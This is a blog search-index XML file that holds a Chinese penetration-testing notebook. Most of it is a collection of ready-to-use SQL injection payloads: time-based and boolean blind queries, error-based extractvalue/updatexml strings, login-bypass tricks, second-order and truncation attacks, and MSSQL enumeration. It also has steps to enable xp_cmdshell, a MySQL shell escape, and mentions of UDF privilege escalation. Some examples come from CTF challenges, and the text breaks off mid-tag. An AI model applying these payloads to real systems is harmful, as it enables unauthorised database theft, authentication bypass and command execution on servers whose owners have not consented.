<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>渗透笔记</title>
      <link href="/2020/02/16/shen-tou-bi-ji/"/>
      <url>/2020/02/16/shen-tou-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><h3 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h3><pre><code>Port: 0-65536</code></pre><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><pre><code>amass enum -d xx.com</code></pre><p>Js finder</p><p>cewl xxx.com &gt;wordlist.txt (generate specific fuzz lists for the website)</p><h2 id="Pro-Tips"><a href="#Pro-Tips" class="headerlink" title="Pro Tips"></a>Pro Tips</h2><p>python -m SimpleHttpserver 8080</p><p>type WindowsUpdate.log (check updates)</p><p>Mysql getshell</p><pre><code>mysql&gt;:\! /bin/bash</code></pre><p>Wildcard: /*/*</p><p>cron里有backup的话试一下ln -s （创建软连接）</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="基础："><a href="#基础：" class="headerlink" title="基础："></a>基础：</h3><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>判断有无注入点</p><p>判断sql库，编码</p><p>判断注入类型</p><h4 id="Mysql常见类型-常用语句："><a href="#Mysql常见类型-常用语句：" class="headerlink" title="Mysql常见类型+常用语句："></a>Mysql常见类型+常用语句：</h4><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><h5 id="盲注常识"><a href="#盲注常识" class="headerlink" title="盲注常识"></a>盲注常识</h5><p>length(str)：<br>返回str字符串的长度。</p><p>substr(str, pos, len)：<br>将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p><p>mid(str,pos,len):跟上面的一样，截取字符串</p><p>ascii(str)：返回字符串str的最左面字符的ASCII代码值。</p><p>ord(str):同上，返回ascii码</p><p>if(a,b,c) :<br>a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p><p>left(str,len)</p><p>首先要记得常见的ASCII，A:65,Z:90 a:97,z:122, 0:48, 9:57</p><h6 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h6><p>定义：不能根据页面返回内容判断信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。函数（sleep（））</p><p>经典payload（sleep参数）</p><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>        <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里使用的是查找出database的第一个字符ascii大小，然后用if搭配sleep函数来判断，如果大于115，则sleep5秒。</p><p>常见的时间盲注有5种：</p><p><strong>1.sleep(x)</strong></p><pre><code>id=&#39; or sleep(3)%23id=&#39; or if(ascii(substr(database(),1,1))&gt;114,sleep(3),0)%23</code></pre><p>查询结果正确，则延迟3秒，错误则无延时。</p><p><strong>2.benchmark()</strong></p><p>通过大量运算来模拟延时：</p><pre><code>id=&#39; or benchmark(10000000,sha(1))%23id=&#39; or if(ascii(substr(database(),1,1))&gt;114,benchmark(10000000,sha(1)),0)%23</code></pre><p>本地测试这个值大约可延时3秒：</p><p><a href="https://s1.ax1x.com/2020/05/12/YUZcP1.png" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/12/YUZcP1.png" alt="YUZcP1.png"></a></p><p><strong>3.笛卡尔积</strong></p><p>计算笛卡尔积也是通过大量运算模拟延时：</p><pre><code>select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables Cselect balabala from table1 where &#39;1&#39;=&#39;2&#39; or if(ascii(substr(database(),1,1))&gt;0,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C),0)</code></pre><p>笛卡尔积延时大约也是3秒</p><p><strong>4.get_lock</strong></p><p>属于比较鸡肋的一种时间盲注，需要两个session，在第一个session中加锁：</p><pre><code>select get_lock(&#39;test&#39;,1)</code></pre><p><a href="https://s1.ax1x.com/2020/05/12/YUebTJ.png" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/12/YUebTJ.png" alt="YUebTJ.png"></a></p><p>然后再第二个session中执行查询：</p><pre><code>select get_lock(&#39;test&#39;,5)</code></pre><p>另一个窗口：</p><p><a href="https://s1.ax1x.com/2020/05/12/YUexl6.png" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/12/YUexl6.png" alt="YUexl6.png"></a></p><p><strong>5.rlike+rpad</strong></p><p>rpad(1,3,’a’)是指用a填充第一位的字符串以达到第二位的长度<br>经本地测试mysql5.7最大允许用单个rpad()填充349525位，而多个rpad()可以填充4个349525位，<br>因此可用：</p><pre><code>select * from table1 where 1=1 and if(mid(user(),1,1)=&#39;r&#39;,concat(rpad(1,349525,&#39;a&#39;),rpad(1,349525,&#39;a&#39;),rpad(1,349525,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asdasdsadasd&#39;,1);</code></pre><p>以上所写是本地测试的最大填充长度，延时0.3秒，最后的asdasdasd对时间长度有巨大影响，可以增长其长度以增大时延<br>这个长度大概是1秒：</p><pre><code>select * from table1 where 1=1 and if(mid(user(),1,1)=&#39;r&#39;,concat(rpad(1,349525,&#39;a&#39;),rpad(1,349525,&#39;a&#39;),rpad(1,349525,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd&#39;,1);</code></pre><p>这个长度大概是2秒：</p><pre><code>select * from table1 where 1=1 and if(mid(user(),1,1)=&#39;r&#39;,concat(rpad(1,349525,&#39;a&#39;),rpad(1,349525,&#39;a&#39;),rpad(1,349525,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasdasdasdasdasdasdasdasdasdasdasdadasdasdasdasdasdasdasdasdasdasdasd&#39;,1);</code></pre><h6 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h6><p>定义：根据返回页面判断条件真假。</p><h6 id="Order-by-盲注"><a href="#Order-by-盲注" class="headerlink" title="Order by 盲注"></a>Order by 盲注</h6><p>order by rand(True)和order by rand(False)的结果排序是不同的，可以根据这个不同来进行盲注：</p><p><img src="https://s1.ax1x.com/2020/05/12/YUV6c8.png" alt="YUV6c8.png"></p><p>Eg: order <strong>by</strong> <strong>rand</strong>(database()=’pdotest’)</p><p><img src="https://s1.ax1x.com/2020/05/12/YUVhAs.png" alt="YUVhAs.png"></p><p>返回了True的排序，说明database()=’pdotest’是正确的值</p><h5 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h5><p>定义：使用union情况下注入。</p><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>定义：页面返回错误信息，或把注入的语句直接返回在页面。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">.</span>floor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">.</span>extractvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">.</span>updatexml<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">4</span><span class="token punctuation">.</span><span class="token keyword">geometrycollection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">geometrycollection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">5</span><span class="token punctuation">.</span><span class="token keyword">multipoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multipoint</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">6</span><span class="token punctuation">.</span><span class="token keyword">polygon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">polygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">7</span><span class="token punctuation">.</span><span class="token keyword">multipolygon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multipolygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">8</span><span class="token punctuation">.</span><span class="token keyword">linestring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">linestring</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">9</span><span class="token punctuation">.</span><span class="token keyword">multilinestring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multilinestring</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">10</span><span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="堆查询注入"><a href="#堆查询注入" class="headerlink" title="堆查询注入"></a>堆查询注入</h5><p>定义：执行多条sql语句构造的注入。</p><h5 id="HTTP分割注入"><a href="#HTTP分割注入" class="headerlink" title="HTTP分割注入"></a>HTTP分割注入</h5><p>如果存在一个登录场景，参数为username&amp;password</p><p>查询语句为select xxx from xxx where username=’xxx’ and password=’xxx’</p><p>但是username参数过滤了注释符，无法将后面的注释掉，则可尝试用<strong>内联注释</strong>把password注释掉，凑成一条新语句后注释或闭合掉后面的语句：</p><p>例如实验吧加了料的报错注入：</p><p><a href="https://p0.ssl.qhimg.com/dm/1024_104_/t012f242a6b29cf0131.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/dm/1024_104_/t012f242a6b29cf0131.png" alt="img"></a></p><p><a href="https://p1.ssl.qhimg.com/t013a39d4247334604f.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t013a39d4247334604f.png" alt="img"></a></p><p>（来源：<a href="https://www.cnblogs.com/s1ye/p/8284806.html）" target="_blank" rel="noopener">https://www.cnblogs.com/s1ye/p/8284806.html）</a></p><p>这样就凑成了如下的语句,将password参数直接注释掉：</p><pre><code>select * from users where username=&#39;1&#39; or extractvalue/*&#39;and password=&#39;1*/(1,concat(0x7e,(select database()),0x7e))) or &#39;&#39;;</code></pre><p>当然这种注入的前提是<strong>单引号没有被过滤</strong>。如果过滤不太多的话，其实也有很多其他的方式如：</p><pre><code>POST username=1&#39; or if(ascii(substr(database(),1,1))=115,sleep(3),0) or &#39;1&amp;password=1凑成：select * from users where username=&#39;1&#39; or if(ascii(substr(database(),1,1))&gt;0,sleep(3),0) or &#39;1&#39; and password=&#39;1&#39;</code></pre><p>还有一个例子是GYCTF中的一道sql注入题，通过注入来登录：</p><p><a href="https://imgchr.com/i/YUMyIe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/12/YUMyIe.png" alt="YUMyIe.png"></a></p><p>过滤了空格,union,#,—+,/*,^,or,|</p><p>这样上面用类似or ‘1’=’1’万能钥匙的方式来注入就不太可能了。</p><p>可以考虑<strong>将password作为函数的参数</strong>来闭合语句：</p><pre><code>username=admin&#39;and(strcmp(&amp;password=,&#39;asdasdasdasdasdasd&#39;))and&#39;1这样凑成：select username from users where username=&#39;admin&#39;and(strcmp(&#39;and password=&#39;,&#39;asdasdasdasdasdasd&#39;))and&#39;1&#39;</code></pre><p>strcmp比较，二者不一致返回True，一致返回False，而MySQL会将’1’判断为数字1，即True，因此该查询语句结果为True</p><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>二次注入就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题</p><p>假如登录/注册处的SQL语句没有可以注入的地方，并将username储存在session中，而在登录之后页面查询语句没有过滤，为：</p><p>select * from users where username=’$_SESSION[‘username’]’</p><p>则我们在注册的时候便可将注入语句写入到session中，在登录后再查询的时候则会执行SQL语句：</p><p>如username=admin’#，登录后查询语句为：</p><pre><code>select * from users where username=&#39;admin&#39; #&#39;</code></pre><p>就构成了SQL注入。</p><h5 id="SQL约束攻击"><a href="#SQL约束攻击" class="headerlink" title="SQL约束攻击"></a>SQL约束攻击</h5><p>假如注册时username参数在mysql中为<strong>字符串</strong>类型，并且有<strong>unique属性</strong>，设置了长度为VARCHAR(20)。</p><p>则我们注册一个username为admin[20个空格]asd的用户名，则在mysql中首先会判断是否有重复，若无重复，则会<strong>截取前20个字符</strong>加入到数据库中，所以数据库存储的数据为admin[20个空格]，而进行登录的时候，SQL语句会<strong>忽略空格</strong>，因此我们相当于覆写了admin账号。</p><h4 id="常见查询方式："><a href="#常见查询方式：" class="headerlink" title="常见查询方式："></a>常见查询方式：</h4><p>(联合查询)</p><p>and 1=1 and 1-2</p><p>order by xxx</p><p>union select 1, xxx ,2 from table</p><p>（逐字猜解）</p><p>and exists(select * from database/table)</p><p>and exists(select column/Other Type from table/or other type)</p><p>查长度</p><p>and (select top 1 len (user_name) from admin)=5 (user_name的长度=5，正常则=5，也可以用&gt;,&lt;取判断）</p><p>确认asc数据</p><p>and (select top 1 asc(mid(user_name,1,1)from admin)=97 ：判断第一位（97代表‘a’的ascii值）</p><p>and (select top 1 asc(mid(user_name,2,1))from admin)=97: 判断第二位</p><p>and exists(select count(*)from sysobjects) : 显示正常则为SQL Server（MSSQL）</p><p>检测是否为sa/dba权限：</p><p>and 1=(select IS_SRVROLEMEMBER(‘sysadmin/db_owner’));-</p><p>查看当前连接数据库：</p><p>and db_name()&gt;0</p><p>and 1=(select db_name())–</p><p>查看其他数据库：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#dbid从1～4的数据库一般为系统数据库</span><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> quotename<span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>sysdatabases<span class="token punctuation">)</span><span class="token comment" spellcheck="true">--</span><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> cast<span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token keyword">varchar</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchar<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">from</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>sysdatabases<span class="token punctuation">)</span><span class="token comment" spellcheck="true">--</span><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> str<span class="token punctuation">(</span>count <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> quotename<span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>sysdatabases <span class="token keyword">where</span> dbid<span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--</span><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> str<span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2b</span><span class="token string">'|'</span><span class="token keyword">from</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>sysdatabses <span class="token keyword">where</span> dbid<span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">-- </span><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> cast<span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token keyword">varchar</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchar<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">from</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>sysdatabses <span class="token keyword">where</span> dbid<span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> name <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysdatabases <span class="token keyword">where</span> <span class="token operator">and</span> dbid<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>判断有无注入：</p><p>1）粗略型：单引号 ‘,  id=-1,id+1    </p><p>2) 逻辑型（数字）：and 1=1, and 1=2</p><p>3)逻辑型（字符）： ‘and’1’=’1/‘ , and ‘1’=’2</p><p>4）逻辑型（搜索型）：%’and 1=1, and ‘%’=’%%’, and 1=2 and ‘%’=’%</p><p>有回显模式：and @@version&gt;0：由于字符无法和数字进行比较和转换，查询结果会报错并显示有用信息</p><p>无回显模式：and substring((select @@version)),22,4)=’2008’–：后面的2008就是数据库版本，返回正常则为true。</p><p>回显模式：and 1=(select @@version)</p><p>‘ 是为了字符型的判断（例如$id)</p><p>但是如果是数字的话那就不需要加’ 而可以直接在后面加语句了（例如union）</p><p>基本防护：</p><p>字符：单引号，双引号，括号</p><p>常见的sql库：</p><p>Mysql:</p><p>上传MOF提权</p><p>UDF提权：</p><p>条件：&gt;or&lt;5.1时要注意版本和udf路径，拥有权限</p><p><a href="https://github.com/rootphantomer/Python_FuckMySQL">Python_FuckMySQL</a>提权</p><p>口令扫描：sqlping对内网ip进行扫描，获取sa口令</p><p>ascii()返回字符表达式最左端字符的ascci码值，在ascii函数中，纯数字可不用“”包裹起来，但是其他字符的字符串必须用“包裹，否则会报错。</p><p>char（）：将ascii码转换为字符，如果没有输入0～255的ascii码值，char（）返回null</p><p>EXEC sp_configure ‘show advanced options’, 1/0; RECONFIGURE;EXEC sp_configure ‘function’ , 1/0; RECONFIGURE;– </p><p>开启和关闭xp_cmdshell,sp_oacreate,sp_makewebtask,openrowset和advaned options</p><h4 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h4><p>extractvalue()</p><p>extractvalue() :对XML文档进行查询的函数</p><p>其实就是相当于我们熟悉的HTML文件中用 <div><p><a>标签查找元素一样</a></p><p>语法：extractvalue(目标xml文档，xml路径)</p><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><p>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</p><p>select username from security.user where id=1 and (extractvalue(‘anything’,’/x/xx’))<br>这里在’anything’中查询不到 位置是 /database()的内容，</p><p>但也没有语法错误，不会报错，下面故意写入语法错误：</p><p>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</p><p><img src="https://img-blog.csdn.net/20180609105509672" alt="img"></p><p>有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</p><p>这里查询前5位示意:</p><p>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))</p><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>作用：改变文档中符合条件的节点的值</p><pre><code>http://www.target.com/index.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)http://www.target.com/index.php?id=updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)http://www.target.com/index.php?id=updatexml(1,concat(0x7e,SUBSTR((SELECT @@version),1,24),0x7e),1)</code></pre><p>另外，updatexml最多只能显示32位，需要配合<code>SUBSTR</code>使用。</p><pre><code>updatexml(1,concat(0x7e,SUBSTR((SELECT f14g from f14g LIMIT 0,1),1,24),0x7e),1)updatexml(1,concat(0x7e,(select substring(f14g,20) from f14g limit 0,1),0x7e),1)extractvalue(0x0a,concat(0x0a,(select database())))</code></pre><h4 id="Oracle-查询判断"><a href="#Oracle-查询判断" class="headerlink" 